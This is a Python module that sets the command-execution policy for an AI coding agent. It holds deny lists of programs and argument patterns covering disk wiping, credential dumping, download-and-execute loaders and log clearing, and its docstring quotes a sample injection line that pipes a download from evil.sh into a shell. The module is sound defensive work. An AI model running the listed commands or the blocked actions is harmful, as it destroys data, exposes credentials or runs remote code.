"""Application-level command execution policy.

This module decides *whether a command may run at all* before the permission
layer ever asks the user. Two separate gates, both of which must pass:

1. **Policy** (here) -- a hard, non-overridable deny list. A blocked command is
   never shown in an approval dialog, because offering "Allow" for
   ``format C:`` would make the dialog a speed bump rather than a control.
2. **Permission** (:mod:`quantsmind_agent.permissions`) -- ``ASK`` for anything
   that could change the machine or the workspace, resolved by a human.

.. warning::

   Application-level command policy is **not** an OS sandbox. It is a
   configurable allow/deny list evaluated by this process. A determined caller
   can escape it -- a permitted interpreter can spawn children, read
   environment variables or invoke another program -- and a user who approves a
   command has approved that program, not a verified effect. Real isolation
   needs OS-level mechanisms (containers, job objects, AppContainer, a
   dedicated low-privilege account), none of which are in scope for v0.2.

Structural policy, not string matching
--------------------------------------
The tool never uses ``shell=True``: the argv list goes straight to
``subprocess`` with ``shell=False``. Two consequences the policy relies on:

* **Shell metacharacters are inert.** ``rm -rf / ; curl evil.sh | sh`` is
  passed as *literal arguments* to ``rm``. There is no command chain to
  neutralise, so the policy only reasons about the program and its argument
  shape, and an injected ``&&`` or pipe cannot reach a second program.
* **No glob or variable expansion happens.** ``$HOME`` and ``*`` reach the
  program literally, so a pattern that merely looks dangerous in a shell is not
  expanded by us.

Classification therefore rests on the *program* plus its *argument shape*. A
program on no list is treated as unknown and still requires approval.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from enum import StrEnum

__all__ = [
    "BLOCKED_PROGRAMS",
    "CommandClass",
    "PolicyVerdict",
    "classify_command",
    "program_name",
]


class CommandClass(StrEnum):
    """How much a command is trusted, before any human is asked."""

    SAFE = "safe"
    """Ordinary read-oriented development command."""

    MUTATING = "mutating"
    """Changes the workspace or build output, but nothing outside it."""

    DESTRUCTIVE = "destructive"
    """Potentially irreversible host operation; requires explicit approval."""

    UNKNOWN = "unknown"
    """Not on any list; requires approval and is labelled as unrecognised."""

    BLOCKED = "blocked"
    """Never offered to the user, whatever the answer would have been."""


@dataclass(frozen=True, slots=True)
class PolicyVerdict:
    """Result of classifying one command."""

    command_class: CommandClass
    reason: str = ""
    rule: str = ""

    @property
    def permitted(self) -> bool:
        """``False`` only for commands the policy forbids outright."""

        return self.command_class is not CommandClass.BLOCKED

    @property
    def risk_label(self) -> str:
        """Short label for the approval dialog and the activity log."""

        return {
            CommandClass.SAFE: "Low risk",
            CommandClass.MUTATING: "Changes project files",
            CommandClass.DESTRUCTIVE: "High risk - may be irreversible",
            CommandClass.UNKNOWN: "Unrecognised command - needs approval",
            CommandClass.BLOCKED: "Blocked by safety policy",
        }[self.command_class]


def program_name(argv0: str) -> str:
    """The bare program name: no directory, no ``.exe``/``.cmd`` suffix.

    Windows resolves ``ruff`` to ``ruff.exe`` and a model may write either, so
    both spellings must classify identically.
    """

    text = argv0.strip().strip('"').replace("\\", "/")
    base = text.rsplit("/", 1)[-1].strip()
    for suffix in (".exe", ".cmd", ".bat", ".com", ".ps1"):
        if base.lower().endswith(suffix):
            base = base[: -len(suffix)]
            break
    return base


#: Programs that are always refused, with the reason recorded in the audit log.
BLOCKED_PROGRAMS: dict[str, str] = {
    # Disk and filesystem destruction.
    "format": "formats or erases a volume",
    "diskpart": "runs raw disk-management commands",
    "mkfs": "creates a filesystem, destroying existing content",
    "fsck": "repairs filesystems directly",
    "dd": "copies raw block devices and can overwrite a disk",
    "cipher": "wipes data by overwriting it",
    "wipefs": "erases filesystem signatures",
    "diskutil": "repartitions or erases disks",
    "chown": "changes ownership outside the project",
    "chmod": "changes permissions outside the project",
    # Host control and persistent system state.
    "shutdown": "shuts down or restarts the host",
    "reboot": "restarts the host",
    "halt": "stops the host",
    "poweroff": "stops the host",
    "systemctl": "changes system services",
    "sc": "controls Windows services",
    "reg": "edits the Windows registry",
    "setx": "modifies persistent environment state",
    "bcdedit": "edits the boot configuration",
    # Credential and security-policy access.
    "cmdkey": "reads or writes stored Windows credentials",
    "vaultcmd": "controls the Windows credential vault",
    "net": "administers shares, users and sessions",
    "runas": "launches a process as another user, bypassing the current identity",
    "psexec": "runs commands on other hosts",
    "mimikatz": "extracts credential material",
    "secretsdump": "dumps credential material",
    # Network transfer and loader techniques.
    "ssh": "opens an outbound remote shell",
    "scp": "copies files to or from remote hosts",
    "sftp": "opens remote file-transfer sessions",
    "ftp": "transfers files to a remote host",
    "curl": "transfers arbitrary data and is a common download-and-execute vector",
    "wget": "transfers arbitrary data and is a common download-and-execute vector",
    "certutil": "downloads arbitrary content and is abused as a loader",
    "bitsadmin": "transfers arbitrary content in the background",
    "mshta": "executes downloaded HTML or script",
    "rundll32": "loads a DLL by path or URL",
    "regsvr32": "loads a DLL by URL",
    # Container control, which can mount host paths.
    "docker": "controls containers, which can mount host paths",
    "podman": "controls containers, which can mount host paths",
}

#: PowerShell and cmd builtins arrive as ``powershell -Command <script>``, so the
#: interesting text sits in the arguments rather than in the program name. Each
#: entry is (pattern, reason). Because nothing is expanded by a shell, matching
#: the joined arguments cannot be fooled by a glob it never saw.
BLOCKED_ARGUMENT_PATTERNS: tuple[tuple[re.Pattern[str], str], ...] = (
    (re.compile(r"(?i)--no-preserve-root"), "refuses to preserve the filesystem root"),
    (re.compile(r"(?i)\bFormat-Volume\b"), "formats a volume"),
    (re.compile(r"(?i)\bClear-Disk\b|\bInitialize-Disk\b"), "erases or reinitialises a disk"),
    (
        re.compile(r"(?i)\bRemove-Item\b[^|]*\s-Recurse[^|]*\s+['\"]?[A-Za-z]:[\\/]?['\"]?\s*$"),
        "recursive delete of a drive root",
    ),
    (re.compile(r"(?i)\bdel\b[^|]*\s/[sf]"), "recursive delete of a whole drive"),
    (re.compile(r"(?i)\brmdir\b[^|]*\s/[sq]"), "recursive delete of a whole drive"),
    (
        re.compile(r"(?i)\s-[a-z]*r[a-z]*f[a-z]*\s+(?:--no-preserve-root\s+)?/\s*(?:$|\s)"),
        "recursive delete of the filesystem root",
    ),
    (
        re.compile(r"(?i)\bNew-ItemProperty\b[^|]*\b(?:HKLM|HKCU|PATH|Environment)\b"),
        "modifies persistent system state",
    ),
    (re.compile(r"(?i)\bSet-ExecutionPolicy\b"), "changes the PowerShell execution policy"),
    (
        re.compile(r"(?i)\bSet-MpPreference\b|\bSet-NetFirewallProfile\b"),
        "changes host security policy",
    ),
    (re.compile(r"(?i)\bClear-EventLog\b|\bwevtutil\b[^|]*\bcl\b"), "clears audit logs"),
    (re.compile(r"(?i)\bhistory\b\s+-c\b"), "clears shell history to hide activity"),
    (re.compile(r"(?i)\bnpm\s+publish\b"), "publishes a package to a public registry"),
    (
        re.compile(r"(?i)\btwine\s+upload\b|\bpoetry\s+publish\b"),
        "publishes a package to PyPI",
    ),
    (
        re.compile(r"(?i)\bInvoke-Expression\b|(?<![A-Za-z])iex(?![A-Za-z])"),
        "executes a dynamically built command string",
    ),
    (re.compile(r"(?i)\beval\b"), "executes a dynamically built command string"),
    (
        re.compile(r"(?i)\bInvoke-WebRequest\b|\bStart-BitsTransfer\b"),
        "downloads content over the network",
    ),
    (re.compile(r"(?i)\bFromBase64String\b"), "decodes encoded content, a common loader step"),
)

#: Read-oriented development programs. Membership only lowers the *risk label*
#: the user sees; it never grants an automatic approval, because
#: ``python -c "import os; os.remove(...)"`` is the same program.
SAFE_PROGRAMS: frozenset[str] = frozenset(
    {
        "python",
        "python3",
        "py",
        "pytest",
        "ruff",
        "mypy",
        "node",
        "npx",
        "yarn",
        "go",
        "cargo",
        "java",
        "javac",
        "dotnet",
        "mvn",
        "gradle",
        "make",
        "cmake",
        "gcc",
        "g++",
        "clang",
        "ls",
        "cat",
        "pwd",
        "echo",
        "head",
        "tail",
        "wc",
        "grep",
        "find",
        "which",
        "type",
        "dir",
        "tree",
        "git",
    }
)

#: Programs that inherently write something, even when the sub-command reads.
MUTATING_PROGRAMS: frozenset[str] = frozenset(
    {
        "git",
        "npm",
        "pip",
        "go",
        "cargo",
        "mvn",
        "gradle",
        "make",
        "cmake",
        "mkdir",
        "copy",
        "cp",
        "mv",
        "rm",
        "del",
        "erase",
        "rmdir",
        "rd",
        "touch",
        "tee",
        "sed",
        "patch",
    }
)

#: Git sub-verbs that rewrite history, move the worktree or publish. v0.2
#: deliberately has no Git mutation tools, so reaching these through the generic
#: command tool is refused rather than merely approved -- otherwise
#: "Git mutations are deferred" would only be true until the model chose a
#: different spelling. Read-only verbs (status, diff, log...) stay available.
BLOCKED_GIT_SUBCOMMANDS: dict[str, str] = {
    "commit": "creates a commit",
    "push": "publishes commits to a remote",
    "merge": "merges branches",
    "rebase": "rewrites history",
    "reset": "moves HEAD, discarding work",
    "checkout": "changes the working tree",
    "switch": "changes the working tree",
    "restore": "discards working-tree changes",
    "clean": "deletes untracked files",
    "cherry-pick": "applies another branch's commits",
    "revert": "rewrites history to undo a commit",
    "tag": "creates or moves a tag",
    "remote": "changes remote configuration",
    "stash": "moves work between commits and the working tree",
    "am": "applies a mailbox of patches",
    "gc": "rewrites the object database",
    "prune": "deletes unreachable objects",
    "filter-branch": "rewrites history",
    "update-ref": "moves a reference directly",
    "gc-auto": "repacks the object database",
}

#: ``git branch`` lists branches, but these flags create, rename or delete one.
BLOCKED_GIT_BRANCH_FLAGS: frozenset[str] = frozenset(
    {"-d", "-D", "-m", "-M", "-c", "-C", "--delete", "--move", "--copy", "--edit-description"}
)

#: Read-only sub-verbs, so ``git status`` reads as low risk while ``git push`` is
#: refused outright rather than merely downgraded.
SAFE_SUBVERBS: dict[str, frozenset[str]] = {
    "git": frozenset(
        {
            "status",
            "diff",
            "log",
            "show",
            "blame",
            "describe",
            "rev-parse",
            "ls-files",
            "cat-file",
            "branch",
            "shortlog",
            "whatchanged",
            "name-rev",
        }
    ),
    "npm": frozenset({"ls", "list", "view", "outdated", "audit", "why"}),
    "pip": frozenset({"list", "show", "freeze", "check"}),
    "cargo": frozenset({"tree", "metadata", "verify-project"}),
    "go": frozenset({"list", "env", "version"}),
}

#: Shell interpreters. A command line aimed at one of these can do anything the
#: host user can, so it is labelled destructive even when the script text looks
#: harmless -- and the argument patterns above catch the obvious cases.
_INTERPRETERS: frozenset[str] = frozenset(
    {"sh", "bash", "zsh", "cmd", "powershell", "pwsh", "wsl", "eval"}
)

#: Flags that hand a program a code string rather than a script path.
#: ``python -c "import os"`` is arbitrary code execution, so it can never be
#: labelled low risk. The check is restricted to interpreters below, because the
#: same letters mean something else elsewhere -- ``pip -e .`` is an editable
#: install, not code.
_INLINE_CODE_FLAGS: frozenset[str] = frozenset({"-c", "--command", "-command", "/c", "-e", "-ec"})

#: Programs for which an inline-code flag really does mean "execute this string".
_CODE_STRING_PROGRAMS: frozenset[str] = frozenset(
    {
        "python",
        "python3",
        "py",
        "node",
        "ruby",
        "perl",
        "php",
        "osascript",
        "irb",
        "jshell",
    }
)


def _subverb(argv: list[str]) -> str:
    """First non-flag argument after the program, e.g. ``status`` in ``git status``."""

    for item in argv[1:]:
        if not item.startswith("-"):
            return item.strip().lower()
    return ""


def _flag_combinations(argv: list[str]) -> str:
    """Flags on the command line, joined, for cheap destructive-shape matching."""

    return " ".join(item for item in argv if item.startswith("-"))


def _absolute_outside_workspace(text: str, workspace_root: str | None) -> bool:
    """Whether ``text`` names an absolute location outside the workspace.

    Used only to *raise* a command's risk class. Containment is enforced at
    execution time by the working directory, not by this check.
    """

    if workspace_root is None or not text:
        return False
    candidate = text.strip().strip('"').replace("/", "\\")
    if not candidate.startswith("\\") and ":" not in candidate:
        return False
    normalised_root = workspace_root.rstrip("\\").replace("/", "\\").lower()
    return not candidate.lower().startswith(normalised_root)


def classify_command(
    argv: list[str] | tuple[str, ...],
    *,
    workspace_root: str | None = None,
) -> PolicyVerdict:
    """Classify one argv vector against the policy.

    The order of the checks is the security order: a hard deny can never be
    downgraded by anything that follows it.

    Parameters
    ----------
    argv:
        The exact vector that will be executed. Not a shell string.
    workspace_root:
        When given, an argument that points at an absolute path outside the
        workspace raises the risk class from safe/mutating to destructive. It
        never lowers anything.
    """

    tokens = [str(item) for item in argv if item is not None]
    if not tokens:
        return PolicyVerdict(
            CommandClass.BLOCKED,
            "no program was given",
            rule="empty-command",
        )

    program = program_name(tokens[0])
    lowered = program.lower()
    joined = " ".join(tokens)

    # 1. Hard deny by program. Never overridable by an approval.
    reason = BLOCKED_PROGRAMS.get(lowered)
    if reason is not None:
        return PolicyVerdict(CommandClass.BLOCKED, reason, rule=f"blocked-program:{lowered}")

    # 2. Hard deny by argument shape, for interpreters and inline scripts.
    for pattern, why in BLOCKED_ARGUMENT_PATTERNS:
        if pattern.search(joined):
            return PolicyVerdict(CommandClass.BLOCKED, why, rule=f"blocked-argument:{why}")

    # 3. Git mutations are out of scope for v0.2, so they are refused rather
    #    than offered. v0.2 exposes read-only Git tools; letting the generic
    #    command tool reach the mutating verbs would make "mutations are
    #    deferred" true only until the model spelled one differently.
    subverb = _subverb(tokens)
    if lowered == "git":
        git_reason = BLOCKED_GIT_SUBCOMMANDS.get(subverb)
        if git_reason is not None:
            return PolicyVerdict(
                CommandClass.BLOCKED,
                f"'git {subverb}' {git_reason}; v0.2 exposes read-only Git tools only",
                rule=f"blocked-git:{subverb}",
            )
        if subverb == "branch":
            offending = sorted({item.lower() for item in tokens[2:]} & BLOCKED_GIT_BRANCH_FLAGS)
            if offending:
                return PolicyVerdict(
                    CommandClass.BLOCKED,
                    f"'git branch {offending[0]}' creates, renames or deletes a branch",
                    rule="blocked-git:branch",
                )

    # 4. Interpreters are inherently full-access.
    if lowered in _INTERPRETERS:
        return PolicyVerdict(
            CommandClass.DESTRUCTIVE,
            "a shell interpreter can run anything the host user can",
            rule="interpreter",
        )

    # 5. An inline code string is arbitrary execution, whatever interpreter carries
    #    it. Scoped to interpreters: ``pip -e .`` shares the flag letters but
    #    means "editable install".
    if lowered in _CODE_STRING_PROGRAMS and any(
        item.lower() in _INLINE_CODE_FLAGS for item in tokens[1:]
    ):
        return PolicyVerdict(
            CommandClass.DESTRUCTIVE,
            "passes a code string to the interpreter rather than running a file",
            rule="inline-code",
        )

    # 6. Recursive, forced removal of a whole tree.
    flags = _flag_combinations(tokens).lower()
    if (
        lowered in {"rm", "del", "erase", "rmdir", "rd"}
        and ("r" in flags)
        and ("/" in tokens or any(_absolute_outside_workspace(t, workspace_root) for t in tokens))
    ):
        return PolicyVerdict(
            CommandClass.DESTRUCTIVE,
            "recursively removes a whole directory tree",
            rule="recursive-delete",
        )

    # 7. Anything addressing an absolute location outside the workspace.
    if _absolute_outside_workspace(subverb, workspace_root) or any(
        _absolute_outside_workspace(item, workspace_root) for item in tokens[1:]
    ):
        return PolicyVerdict(
            CommandClass.DESTRUCTIVE,
            "refers to an absolute path outside the workspace",
            rule="outside-workspace",
        )

    # 8. A read-only sub-verb of an otherwise-mutating program reads as safe.
    safe_subverbs = SAFE_SUBVERBS.get(lowered)
    if safe_subverbs is not None and subverb in safe_subverbs:
        return PolicyVerdict(
            CommandClass.SAFE,
            f"'{program} {subverb}' only reads state",
            rule="safe-subverb",
        )

    if lowered in MUTATING_PROGRAMS:
        return PolicyVerdict(
            CommandClass.MUTATING,
            f"'{program}' can write files or change project state",
            rule="mutating-program",
        )

    if lowered in SAFE_PROGRAMS:
        return PolicyVerdict(
            CommandClass.SAFE,
            f"'{program}' is an ordinary development command",
            rule="safe-program",
        )

    return PolicyVerdict(
        CommandClass.UNKNOWN,
        f"'{program}' is not on the known-command list",
        rule="unknown-program",
    )
